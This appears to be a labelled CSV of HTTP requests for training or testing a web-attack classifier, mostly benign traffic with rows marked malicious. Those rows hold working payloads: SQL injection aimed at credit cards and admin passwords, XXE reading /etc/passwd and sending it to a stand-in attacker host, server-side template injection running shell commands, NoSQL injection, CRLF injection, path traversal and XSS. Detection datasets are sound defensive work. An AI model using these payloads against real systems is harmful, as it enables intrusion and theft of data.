label,text
benign,"GET /gallery/photos/nature/summer2024 HTTP/1.1
Host: visual-arts-showcase.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://visual-arts-showcase.net/gallery/photos/featured
Cookie: session_token=7dd4a1c7f2934bcb2d5eccf5ad104e29
DNT: 1
Sec-CH-UA: ""Safari"";v=""16"", ""Not A;Brand"";v=""99"", ""Apple"";v=""16""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""iOS""
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1"
benign,"OPTIONS /api/public/events/list HTTP/1.1
Host: event-management.services
Origin: https://app.social-networking-site.net
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Accept, Content-Type
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: application/json
Connection: keep-alive"
benign,"POST /portal/team/invite HTTP/1.1
Host: global-enterprise-solutions.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Length: 108
Connection: keep-alive
Referer: https://global-enterprise-solutions.co/portal/team
Cookie: sessionid=f214a2d8909cf512bd0e837a

csrf_token=c7065a3f4b9a4db0a5e3e76a&form_id=teamInvite&timestamp=1686145402&email=erin.jones%40corporate.com&role=Editor&return_url=%2Fportal%2Fteam"
benign,"POST /settings/email-preferences HTTP/1.1
Host: marketing-tools.dashboardapp.live
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Accept-Language: en-US,en;q=0.7
Referer: https://marketing-tools.dashboardapp.live/settings/email-preferences
Connection: keep-alive

newsletter_subscribe=true&promo_emails=false&redirect_uri=https%3A%2F%2Fmarketing-tools.dashboardapp.live%2Fsettings%2Fconfirmation"
benign,"POST /subscribe HTTP/1.1
Host: urbanmeadows-info.com
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.142 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Accept: application/json, text/plain, */*
Referer: https://urbanmeadows-info.com/news
X-Requested-With: XMLHttpRequest
Connection: keep-alive

email=david.kim%40urbanmail.com"
benign,"PUT /api/data/item123 HTTP/1.1
Host: digital-museum-archive.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Content-Type: text/plain
Content-Length: 28
Accept: */*
Via: 1.1 varnish
X-Forwarded-For: 203.0.113.45
Connection: close

Metadata updated for review"
benign,"GET /news/today/top-stories HTTP/1.1
Host: global-news-now.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Cookie: session=2cb410f7a8; reader_prefs=font-size:16px;color-scheme:light; _ga=GA1.3.123456789.1682325600; visit_count=42
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: fast-response-portal.online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Content-Type: text/plain
Content-Length: 26
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive

Tracking info updated: delayed."
benign,"POST /user/session/logout HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Referer: https://my-personal-blog-site.info/profile
Cookie: login_token=7a9f8e4bcd2a1f5e
User-Agent: curl/7.87.0
Content-Length: 21
Connection: close

csrf_token=ZmQyOXVweDkwMjI"
malicious,"GET /static/..%2F..%2F..%2F..%2Fproc/self/environ HTTP/1.1
Host: media-api-cloud-images.acmecdn.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive"
benign,"POST /session/logout HTTP/1.1
Host: community-game-forum.org
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://community-game-forum.org
Referer: https://community-game-forum.org/profile/settings
Cookie: sid=2e8c5d59f87e4ab29f3b9185a4d73f1a; theme=light
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15

csrf_token=dcf2b9a30eba4521afc7e9a1"
benign,"GET /v3/data/xml/books HTTP/1.1
Host: nextgen-media-publishing.ai
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Authorization: Bearer token-XX2354fghj9832
Cache-Control: max-age=3600
DNT: 1
Connection: keep-alive"
benign,"POST /api/v1/inventory/createProduct HTTP/1.1
Host: supplychain-management.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fakesignature1234
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Length: 299
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<Product>
  <Name>Portable Solar Charger</Name>
  <Category>Electronics</Category>
  <Price>49.99</Price>
  <SKU>PSC-2024-0098</SKU>
  <Stock>250</Stock>
  <Dimensions>
    <Length unit=""cm"">15</Length>
    <Width unit=""cm"">7</Width>
    <Height unit=""cm"">2</Height>
  </Dimensions>
</Product>"
benign,"HEAD /v2/check/health HTTP/1.1
Host: secure-access-gateway.net
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /filesafe/download?file=report-final.pdf HTTP/1.1
Host: safe-docs-cloud.tech
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: application/pdf
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Connection: close
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Length: 26

{""filePath"": ""/etc/hosts""}"
malicious,"POST /user/settings HTTP/1.1
Host: api.cloud-data-services.ai
X-Forwarded-For: 192.168.1.45%0d%0aX-Injected-Header:%20InjectedData
Content-Type: application/json
User-Agent: curl/7.77.0
Accept: */*
Content-Length: 27

{""email"":""user@domain.com""}"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: knowledge-base-network.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://knowledge-base-network.io/wiki/Main_Page"
benign,"GET /static/v1/images/background.jpg HTTP/1.1
Host: community.game-dev-forum.org
Accept: image/webp,image/apng,image/*,*/*;q=0.8
If-None-Match: W/""167f00cd3d""
Cache-Control: no-cache
Connection: keep-alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.134 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9"
benign,"POST /documents/submit HTTP/1.1
Host: legal-documents-hub.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US
Content-Type: multipart/form-data; boundary=----FormBoundaryUpload123
Content-Length: 229

------FormBoundaryUpload123
Content-Disposition: form-data; name=""file""; filename=""agreement_terms.txt""
Content-Type: text/plain

Agreement terms verified with legal department; no confidential data included.
------FormBoundaryUpload123--"
benign,"POST /blog/article/view/315/comment HTTP/1.1
Host: urban-foodies-journal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Accept-Language: en-US,en;q=0.8
Origin: https://urban-foodies-journal.net
Referer: https://urban-foodies-journal.net/blog/article/view/315
Cookie: uid=2357zx92; csrftoken=5dc381ab
Connection: keep-alive

author_name=Emily+R.&comment_text=Great+recipe%21+Tried+it+and+loved+the+flavor.&csrfmiddlewaretoken=5dc381ab"
benign,"POST /editor/scripts HTTP/1.1
Host: media-hosting-platform.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Content-Type: application/javascript
Content-Length: 34
Accept-Encoding: gzip, deflate

console.log('SEO bot script loaded');"
malicious,"POST /data/validate/pattern HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 184
Referer: https://console.cloud-data-services.ai/dashboard
Sec-CH-UA: ""Chromium"";v=""94"", ""Google Chrome"";v=""94"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Cache-Control: no-cache

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
malicious,"POST /api/v3/xml/process HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/xml
Accept-Language: en-US,en;q=0.5
Content-Length: 195

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE product [
<!ELEMENT product ANY >
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
<product>
  <productId>&xxe;</productId>
  <description>Some product</description>
</product>"
benign,"POST /content/upload/document HTTP/1.1
Host: professional-documents.co.uk
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTH3ujrlYLKeIOq5Q
Content-Length: 310
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Origin: https://professional-documents.co.uk
Connection: keep-alive

------WebKitFormBoundaryTH3ujrlYLKeIOq5Q
Content-Disposition: form-data; name=""upload""; filename=""summary.pdf""
Content-Type: application/pdf

%PDF-1.4
%...
Simple PDF placeholder content for document upload.
------WebKitFormBoundaryTH3ujrlYLKeIOq5Q--"
benign,"GET /xml/users?role=moderator&active=true HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/xml
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate
Referer: https://community.game-dev-forum.org/home
Connection: keep-alive"
benign,"POST /inventory/update-item HTTP/1.1
Host: api.warehouse-manager.biz
Content-Type: application/json
Accept: application/json
Origin: https://warehouse-manager.biz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.pqr678stu901vwx234yzb567
X-CSRF-Token: fc2a98d5c4b3e7a1d2f9
X-Requested-With: FetchAPIClient
User-Agent: curl/7.85.0
Content-Length: 50

{""itemId"":4529,""stockLevel"":120,""location"":""Aisle 5""}"
benign,"GET /scripts/v1/core.js HTTP/1.1
Host: smart-city-dashboard.coop
Accept: application/javascript
Referer: https://smart-city-dashboard.coop/map/layers
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Connection: keep-alive"
benign,"GET /resources/export?file=report-final.pdf HTTP/1.1
Host: devops-tools-platform.dev
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate, br
Accept: application/json
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy.token.string"
benign,"PUT /updates/profile/86 HTTP/1.1
Host: secure-membership-platform.cooptech.eu
Authorization: Bearer d29jdGZkanNmODU2YXZoYm5zZ2JhZWY4Y3Q4ZXZz
Origin: https://secure-membership-platform.cooptech.eu
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Length: 90

{""address"":{""street"":""123 Maple Ave"",""city"":""Portland"",""postalCode"":""97209""},""preferences"":{""contactMethod"":""email""}}"
malicious,"GET /items/filter?sort=asc&sort=desc&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: analytics.data-streams.xyz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Referer: https://analytics.data-streams.xyz/report
Connection: keep-alive"
malicious,"GET /users?q=%26lt%3Bscript%26gt;alert&#x28;&#x27;XSS_%20Vulnerability_Found&#x27;&#x29;%26lt%3B%2fscript%26gt; HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Referer: https://secure-user-portal.net/dashboard
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
benign,"DELETE /api/v1/chats/room-67f28e8 HTTP/1.1
Host: realtime-messenger.community-chat-services.org
Authorization: Bearer 4l0q5k1337g12hxvyr8fcjma
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br"
benign,"GET /whitepapers/2024/future-tech-trends.pdf HTTP/1.1
Host: research-insights.ai
Accept: application/pdf
Referer: https://research-insights.ai/reports/overview
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /media/docs?file=report-final.pdf HTTP/1.1
Host: global-library-services.club
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36
Accept: application/pdf, application/msword
DNT: 1
Referer: https://global-library-services.club/library
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /api/v2/search/shop?query=organic%20green%20tea%20loose%20leaf%20bulk%20purchase%20discount%20renewable%20packaging%20supplier%20reviews%20and%20ratings HTTP/1.1
Host: fresh-natural-harvest.biz
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36
Referer: https://fresh-natural-harvest.biz/
Connection: keep-alive"
malicious,"GET /search HTTP/1.1
Host: gadgettrendsworld.org
User-Agent: curl/7.77.0
Accept: */*
Cookie: lang=en-US; tracking_id=xyz'%20OR%20IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#
Cache-Control: max-age=0"
benign,"POST /product/catalog/actions HTTP/1.1
Host: online-retail-craftworks.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Content-Length: 32
Cache-Control: no-cache

action=delete_item&item_id=ls-pro-v2"
benign,"POST /api/v2/account/update HTTP/1.1
Host: api.secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123def456ghi789
Content-Type: application/json
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Content-Length: 112

{
  ""user.profile-settings"": {""theme-mode"": ""dark"", ""notifications_enabled"": true},
  ""account-status"": ""active"",
  ""preferences.language"": ""en-US""
}"
benign,"GET /user_uploads/pics/nature-scenery_2023_07_18.jpg HTTP/1.1
Host: greenleaf-photo-services.ai
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://greenleaf-photo-services.ai/gallery/landscapes
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Connection: keep-alive"
malicious,"GET /jump?url=http://shopper-retail-zone.org@phish-bait.biz/cart HTTP/1.1
Host: shopper-retail-zone.org
User-Agent: Python-urllib/3.9
Accept: */*
Accept-Encoding: identity
Connection: close"
benign,"PUT /settings/v2/project/configuration HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.VnlyZC1jaGFuZ2Vz.Mr9tqXeQiV4Em41VtxNpAJ8ZjhaycS7tKDXNeqjPdhk
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: curl/7.82.0
Content-Length: 365

{""deployment"":{""region"":""us-west-2"",""nodes"":[{""id"":""node-1"",""type"":""db"",""storage"":{""sizeGB"":500,""encrypted"":true}},{""id"":""node-2"",""type"":""app"",""replicas"":3}]},""features"":{""betaAccess"":true,""modules"":[""compute"",""monitoring""],""limits"":{""maxUsers"":5000,""maxRequestsPerSecond"":1200}},""metadata"":{""owner"":""team-delta"",""lastUpdate"":""2024-06-15T14:22:31Z""}}"
benign,"GET /api/v1/inventory/items?status=available&limit=15 HTTP/1.1
Host: data-stream-hub.io
Accept: application/json
X-Api-Token: 927fa4b1c3e84ba8a1d57d994eb43566
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /robots.txt HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/plain, text/html;q=0.9
Accept-Language: en-GB,en;q=0.8
DNT: 1
Connection: keep-alive"
malicious,"POST /api/v2/user/redirect HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 248
Connection: keep-alive
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/app/login
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123xyz

{""redirect_url"": ""/dashboard%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://malicious-redirect.biz%0d%0a%0d%0a<html><body>You've been redirected</body></html>""}"
benign,"GET /v2/metadata/fetch?url=https%3A%2F%2Fblog.community-game-dev-forum.org%2Fthread%2F5678 HTTP/1.1
Host: services.community-game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Pragma: no-cache"
malicious,"POST /api/v1/import/xml HTTP/1.1
Host: integration.secure-transfer-api.net
Content-Type: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept: application/xml, text/xml, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 287

<!DOCTYPE root [
<!ENTITY % localfile SYSTEM ""file:///etc/passwd"">
<!ENTITY % externaldtd SYSTEM ""http://data-exfiltration-attackersite.ai/evil_payload.dtd"">
%externaldtd;
%exfiltrate;
]>
<root>
  <importData>some safe data</importData>
</root>"
benign,"POST /profile/edit HTTP/1.1
Host: tech-startup-hub.co.uk
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 421
Connection: close

username=alex_theron&display_name=Alex+Theron&email=alextheron%40tech-startup-hub.co.uk&phone=+447912345678&company=Innovate+Labs&job_title=CTO&website=https%3A%2F%2Falextheron.dev&bio=Founder+and+tech+enthusiast&location=London%2C+UK&twitter=%40alextheron&linkedin=alex-theron&github=alextheron&timezone=Europe%2FLondon&language=en&email_notifications=yes&sms_alerts=no&newsletter_subscribe=yes&two_factor_auth=yes&preferred_contact=email&timezone_offset=+0100&profile_visibility=public&session_timeout_minutes=20&dark_mode_enabled=false&beta_feature_access=true&backup_email=alex.backup%40mail.com&account_status=active&csrf_token=883dad84222f074d1b"
benign,"POST /blog/admin/new-post HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 182
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Referer: https://my-personal-blog-site.info/blog/admin
Cookie: session=czl3t0hhg93ccgnbiquqkchlngmueccnct7ajp3x

title=The+Future+of+Web+Development&content=Exploring+trends+and+tools+in+2024&csrf_token=b6f3dc61f5d04fefb8ec3e62970e8267&form_id=new_post_397&timestamp=1685672512&return_url=%2Fblog%2Fedit%2Fnew-post"
benign,"POST /service/upload HTTP/1.1
Host: upload-documents-secure.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
X-Requested-With: XMLHttpRequest
Accept: application/json
User-Agent: Python-urllib/3.11
Content-Length: 202
Connection: keep-alive

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""title""

Quarterly Report
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""file""; filename=""report_q2.pdf""
Content-Type: application/pdf

%PDF-1.7 binarycontenthere...
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
malicious,"GET /blog/article/view?id=321&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://my-personal-blog-site.info/articles
Cache-Control: max-age=0
Connection: close"
malicious,"POST /api/v2/user/search HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/app/user/search
Connection: keep-alive

{""query"":{""$where"":""this.username == 'admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"GET /dashboard/view?id=1024&sort=recent&filter=active HTTP/1.1
Host: portal-analytics-server.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://portal-analytics-server.io/dashboard/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
malicious,"GET /reports/summary HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Referer: http://reports.my-personal-blog-site.info/{#{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /proc/cpuinfo | head -10').read()}}#}
Connection: keep-alive"
benign,"GET /rss.xml HTTP/1.1
Host: tech-insights-lab.net
Accept: application/rss+xml, application/xml;q=0.9, */*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Referer: https://tech-insights-lab.net/blog/latest-updates
Connection: keep-alive
Accept-Language: en-US,en;q=0.9"
malicious,"POST /api/v1/validate HTTP/1.1
Host: nextgen-cloud-solutions.net
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Sec-CH-UA: ""Chromium"";v=""90"", ""Google Chrome"";v=""90"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Cache-Control: no-cache

{
  ""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""
}"
benign,"GET /browse/catalog/item?name=param%3DHello%252520World&category=books HTTP/1.1
Host: browse.electro-hub.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: application/xml, text/xml, */*
Accept-Encoding: gzip
Cache-Control: max-age=0
Connection: keep-alive
Referer: https://browse.electro-hub.io/home"
benign,"PUT /profile/settings/data HTTP/1.1
Host: io-sync-node.tech
Authorization: Bearer token-fj38urhf938hf9wfh
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Length: 147
Connection: keep-alive

{""profileId"":""9200abde"",""configB64"":""eyJoZWFkZXIiOnsic21zIjoiYmFzaWMifSwic2lnbmFsdXJlIjoiamF2YXNjcmlwdCJ9""}"
